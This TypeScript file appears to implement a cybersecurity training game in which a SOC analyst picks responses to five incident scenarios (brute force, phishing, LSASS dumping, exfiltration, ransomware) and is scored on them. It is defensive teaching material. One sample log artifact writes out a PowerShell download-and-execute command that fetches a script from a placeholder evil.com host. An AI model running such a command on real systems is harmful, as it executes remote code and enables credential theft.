import { GameState, Scenario, Feedback, FinalReport } from "../types";

// Helper to get rank based on XP/Score
export function calculateRank(score: number): string {
  if (score > 120) return "Incident Commander";
  if (score > 90) return "SOC Tier 3 Specialist";
  if (score > 60) return "Threat Hunter";
  if (score > 30) return "Junior Analyst";
  return "Trainee Analyst";
}

// Predefined scenarios for the game rounds
const SCENARIOS_POOL: Scenario[] = [
  // ROUND 1: INITIAL RECON AND LOGIN ANOMALIES
  {
    id: "scen-1-a",
    title: "Endpoint Alert: Brute-Force Activity",
    description: "SIEM flagged an alert from 'SRV-ENT-04'. Multiple failed login attempts detected on the CEO's workstation from an external IP: 185.192.69.4. Active session attempts peak during off-hours.",
    mitreStage: 'Credential Access',
    artifacts: [
      { type: 'log', label: 'Auth Logs', content: '2026-05-01 03:22:11 - FAIL - user: j.doe - IP: 185.192.69.4\n2026-05-01 03:22:12 - FAIL - user: j.doe - IP: 185.192.69.4' },
      { type: 'network', label: 'GeoIP', content: 'Origin: RU (Krasnodar) - Type: Known Hosting Provider (Digital Ocean)' }
    ],
    options: [
      { id: "opt-1-a-1", label: "Reset Password & Notify", explanation: "Standard remediation.", flag: 'passive_remediation' },
      { id: "opt-1-a-2", label: "Check IP Reputation", explanation: "Gather intel first.", flag: 'intel_gathering' },
      { id: "opt-1-a-3", label: "Ignore - Account Locked", explanation: "Wait for signal.", flag: 'ignored_recon' },
      { id: "opt-1-a-4", label: "Block IP at Firewall", explanation: "Active containment.", flag: 'active_blocking' }
    ]
  },
  // ROUND 2: INITIAL ACCESS / PHISHING
  {
    id: "scen-2-a",
    title: "Email Gateway: Suspicious Attachment",
    description: "Proofpoint isolated an email: 'Subject: Internal_Salary_Review_2026.zip'. Sender: hr-no-reply@comp-hr.net. One user in Accounts Payable clicked before isolation.",
    mitreStage: 'Initial Access',
    artifacts: [
      { type: 'email', label: 'Header Data', content: 'From: hr-support <spoofed@comp-hr.net>\nX-Mailer: PHPMailer 5.2.22\nReturn-Path: <scammer@gmail.com>' },
      { type: 'process', label: 'Endpoint Signal', content: 'EventID 1: Process Created - cmd.exe /c start payroll.js' }
    ],
    options: [
      { id: "opt-2-a-1", label: "Isolate Clicker's Host", explanation: "Contain immediately.", flag: 'rapid_isolation' },
      { id: "opt-2-a-4", label: "Analyze in Sandbox", explanation: "Reveal intent.", flag: 'forensics_led' },
      { id: "opt-2-a-2", label: "Scan Traffic Logs", explanation: "Check for C2 callbacks.", flag: 'recon_led' },
      { id: "opt-2-a-3", label: "Send Policy Reminder", explanation: "User awareness.", flag: 'slow_remediation' }
    ]
  },
  // ROUND 3: LATERAL MOVEMENT / PERSISTENCE
  {
    id: "scen-3-a",
    title: "EDR Signal: PowerShell Anomaly",
    description: "An unusual PowerShell process is spawning on 'WEB-PROD-02'. It appears to be attempting to dump memory from 'lsass.exe' to a temp file.",
    mitreStage: 'Credential Access',
    artifacts: [
      { type: 'process', label: 'Sysmon Event 10', content: 'SourceImage: powershell.exe\nTargetImage: lsass.exe\nGrantedAccess: 0x1010' },
      { type: 'log', label: 'Command Line', content: 'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/dump.ps1\")' }
    ],
    options: [
      { id: "opt-3-a-3", label: "Isolate Endpoint", explanation: "Full containment.", flag: 'hard_containment' },
      { id: "opt-3-a-1", label: "Kill PowerShell Tree", explanation: "Stop execution.", flag: 'soft_containment' },
      { id: "opt-3-a-2", label: "Memory Dump & Analysis", explanation: "Preserve evidence.", flag: 'evidence_collection' },
      { id: "opt-3-a-4", label: "Run Full AV Scan", explanation: "Reactive cleaning.", flag: 'low_efficiency' }
    ]
  },
  // ROUND 4: EXFILTRATION / IMPACT
  {
    id: "scen-4-a",
    title: "Network Monitor: TLS Tunnel",
    description: "Intrusion Detection (IDS) flagged persistent encrypted traffic from 'DEV-TEST-09' to a rare TLD (.top). Transfer size: 840MB and climbing.",
    mitreStage: 'Exfiltration',
    artifacts: [
      { type: 'network', label: 'Flow Data', content: 'Src: 10.0.4.12 -> Dst: 45.33.21.9\nPort: 443 (TLS v1.3)\nDuration: 42m 12s' },
      { type: 'network', label: 'DNS Query', content: 'Query: data-sync-mirror.x7z.top' }
    ],
    options: [
      { id: "opt-4-a-2", label: "Shun Destination IP", explanation: "Stop the flow.", flag: 'exfil_blocked' },
      { id: "opt-4-a-1", label: "Interview Owner", explanation: "Verify legitimacy.", flag: 'slow_verify' },
      { id: "opt-4-a-4", label: "Revoke Cloud Access", explanation: "Kill authentication.", flag: 'iam_remediation' },
      { id: "opt-4-a-3", label: "Mirror Traffic", explanation: "Observe traffic.", flag: 'passive_intel' }
    ]
  },
  // ROUND 5: IMPACT / FINAL DEFENSE
  {
    id: "scen-5-a",
    title: "Service Outage: Crypto-Locking",
    description: "Helpdesk flooded with tickets. Shared volumes on 'FS-CORP-01' are being renamed with '.locked' extensions. A ransom note demanding 5 BTC is visible.",
    mitreStage: 'Impact',
    artifacts: [
      { type: 'network', label: 'File Activity', content: 'Rename: invoice_2025.pdf -> invoice_2025.pdf.locked' },
      { type: 'process', label: 'Ransom Note', content: 'ALL YOUR FILES ARE BELONG TO US. DECRYPT_INSTRUCTIONS.TXT' }
    ],
    options: [
      { id: "opt-5-a-1", label: "Hard Power-Down", explanation: "Extreme containment.", flag: 'nuclear_remediation' },
      { id: "opt-5-a-3", label: "Locate Patient Zero", explanation: "Identify & Kill.", flag: 'sniper_remediation' },
      { id: "opt-5-a-2", label: "Kill SMB Service", explanation: "Stop the spread.", flag: 'protocol_block' },
      { id: "opt-5-a-4", label: "Initiate Restore", explanation: "Ignore & Recovery.", flag: 'recovery_led' }
    ]
  }
];

const FEEDBACK_DB: Record<string, Feedback> = {
  // Round 1
  "opt-1-a-4": { 
    consequence: "Source Neutralized", 
    scoreDelta: 20, riskDelta: -10, confidenceDelta: 5, 
    explanation: "Blocking at the edge is the most efficient response to persistent external brute force.",
    chainEffect: "System hardening verified. Future credential stuffing attempts will be harder."
  },
  "opt-1-a-1": { 
    consequence: "Creds Rotated", 
    scoreDelta: 10, riskDelta: -2, confidenceDelta: 5, 
    explanation: "Secured the account, but the attacker is still probing your infrastructure.",
    chainEffect: "Attacker shifts focus to secondary staff accounts."
  },
  // Round 2
  "opt-2-a-1": { 
    consequence: "Breach Contained", 
    scoreDelta: 25, riskDelta: -15, confidenceDelta: 10, 
    explanation: "Swift host isolation prevented the 'payroll.js' loader from fetching the final stage malware.",
    chainEffect: "Attackers unable to establish a beachhead. Threat persistence lowered."
  },
  "opt-2-a-3": { 
    consequence: "Operational Slowdown", 
    scoreDelta: -5, riskDelta: 10, confidenceDelta: -5, 
    explanation: "The user's machine became a proxy for the attacker while you were writing emails.",
    chainEffect: "Lateral movement initiated on the local subnet."
  },
  // Round 3
  "opt-3-a-3": { 
    consequence: "Credentials Safe", 
    scoreDelta: 25, riskDelta: -20, confidenceDelta: 10, 
    explanation: "Isolating the endpoint prevented memory scraping. LSASS credentials remain secure.",
    chainEffect: "Attacker lacks domain admin privileges. Crisis averted."
  },
  "opt-3-a-4": { 
    consequence: "Security Failure", 
    scoreDelta: -15, riskDelta: 25, confidenceDelta: -10, 
    explanation: "AV failed to detect the custom script. Attacker successfully extracted NTLM hashes.",
    chainEffect: "DOMAIN ADMIN PASSWORD HASHES COMPROMISED. Risk at critical."
  },
  // Round 5
  "opt-5-a-3": { 
    consequence: "Tactical Victory", 
    scoreDelta: 30, riskDelta: -15, confidenceDelta: 20, 
    explanation: "You identified the infected HR workstation and cut its access before it could encrypt the backup volumes.",
    chainEffect: "Recovery time minimized. Business continuity preserved."
  }
};

export async function generateScenario(state: GameState): Promise<Scenario> {
  await new Promise(r => setTimeout(r, 600));
  
  // pick scenarios based on round
  const roundScenarios = SCENARIOS_POOL.filter(s => s.id.startsWith(`scen-${state.round}`));
  
  return roundScenarios[0] || SCENARIOS_POOL[0];
}

export async function processDecision(scenario: Scenario, optionId: string): Promise<Feedback> {
  await new Promise(r => setTimeout(r, 400));
  return FEEDBACK_DB[optionId] || {
    consequence: "Action Recorded",
    scoreDelta: 5,
    riskDelta: 0,
    confidenceDelta: 5,
    explanation: "Your action was processed by the SOC management system."
  };
}

export async function generateFinalReport(state: GameState): Promise<FinalReport> {
  await new Promise(r => setTimeout(r, 1000));
  
  const score = state.score;
  const rankTitle = calculateRank(score);
  
  return {
    rating: score > 100 ? "Elite Operational Status" : score > 60 ? "Proficient Analyst" : "Needs Retraining",
    rankTitle,
    goodDecisions: [
      "Effectively used network segmentation during outbreaks.",
      "Prioritized host isolation based on threat level."
    ],
    riskyChoices: [
      "Allowed recon signals to persist longer than recommended.",
      "Initial response to credential dumping was reactive."
    ],
    recommendations: [
      "Improve Sysmon logging for better LSASS dump visibility.",
      "Review edge firewall rules for Digital Ocean hosting blocks.",
      "Deploy canary tokens on critical file shares."
    ]
  };
}
